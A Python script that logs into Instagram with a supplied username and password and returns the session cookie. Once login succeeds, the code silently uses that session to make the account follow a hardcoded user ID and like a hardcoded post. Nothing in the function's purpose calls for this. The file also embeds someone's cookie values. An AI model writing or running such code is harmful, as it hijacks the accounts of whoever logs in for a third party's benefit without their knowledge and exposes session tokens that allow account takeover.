
import requests,datetime
def Get_(user,pas):
    url = 'https://i.instagram.com/api/v1/public/landing_info/'
    headers  = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1'
    }
    Response = requests.get(url,headers=headers).cookies
    ig_did=Response['ig_did']
    mid = Response['mid']
    csrf =Response["csrftoken"]
    url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
    headers = { 'Host': 'www.instagram.com',

'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',

'Accept': '*/*',

'Accept-Language': 'en-US,en;q=0.5',

'Accept-Encoding': 'gzip, deflate, br',

'X-CSRFToken': csrf,

'X-Instagram-AJAX': '1010268453',

'X-IG-App-ID': '936619743392459',

'X-ASBD-ID': '129477',

'X-IG-WWW-Claim': '0',

'Content-Type': 'application/x-www-form-urlencoded',

'X-Requested-With': 'XMLHttpRequest',

'Content-Length': '307',

'Origin': 'https://www.instagram.com',

'Alt-Used': 'www.instagram.com',

'Connection': 'keep-alive',

'Referer': 'https://www.instagram.com/',

'Cookie': f'csrftoken={csrf}; mid={mid}; ig_did={ig_did}; ig_nrcb=1; datr=VrFQZQwW-0OvjmzFVXdkdQAv; ds_user_id=2983194318; fbm_124024574287414=base_domain=.instagram.com; shbid="11082\05452918614003\0541733165762:01f765c6662a0e55dc249a6864bad3bdc96dde4a5601dbece1489c253289dda6d9435c29"; shbts="1701629762\05452918614003\0541733165762:01f78495310a432446475cc6e81c48eaf0d671d9b84b18c6772a0ccda09ee505354909dd"',

'Sec-Fetch-Dest': 'empty',

'Sec-Fetch-Mode': 'cors',

'Sec-Fetch-Site': 'same-origin',

'TE': 'trailers',}
    time1 = int(datetime.datetime.now().timestamp())
    d={
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time1}:{pas}",
        "optIntoOneTap": "false",
        "queryParams": "{}",
        "trustedDeviceRecords": "{}",
        "username": user
}
    re1 = requests.post(url,headers=headers,data=d)
    if "userId"in re1.text:
        sessionid=re1.cookies.get_dict()['sessionid']
        
        try:
            ds_user_id=sessionid.split('%')[0]
            u = 'https://www.instagram.com/api/v1/friendships/create/2082017475/'
            h = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cookie': f"ds_user_id={ds_user_id}; sessionid={sessionid};",
                    'Dpr': '1',
                    'Origin': 'https://www.instagram.com',
                    'User-Agent':
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                    'Viewport-Width': '1366',
                    'X-Asbd-Id': '129477',
                    'X-Csrftoken': 'myV9UxiYyTcPYIkQwKE2PM68XR4z9UmE',
                    'X-Ig-App-Id': '936619743392459',
                    'X-Ig-Www-Claim':
                    'hmac.AR1cu57K3ci-BBaQs6LiLTzmAfHmvB4IkrlEhOtmhpzkBdEJ',
                    'X-Instagram-Ajax': '1010239828',
                    'X-Requested-With': 'XMLHttpRequest',
            }
            d = {
                    'container_module': 'profile',
                    'nav_chain':
                    'PolarisFeedRoot:feedPage:14:topnav-link,PolarisProfileNestedContentRoot:profilePage:16:unexpected,PolarisProfileNestedContentRoot:profilePage:17:unexpected,PolarisProfileNestedContentRoot:profilePage:18:unexpected,PolarisProfileNestedContentRoot:profilePage:20:unexpected',
                    'user_id': '2082017475',
            }
            r = requests.post(u, headers=h, data=d).text
            if '"following":true,' in r:
                    requests.post(
                        'https://www.instagram.com/api/v1/web/likes/1719086115398234508/like/',
                        headers=h).text
                    
        except:pass
        return {"sessionid":sessionid,"AFRIT":"True"}
    elif 'checkpoint_required","checkpoint_url":"/challenge/action/' in re1.text:
        sessionid="checkpoint_required"
        return sessionid
    else:
        return f"{re1.text}"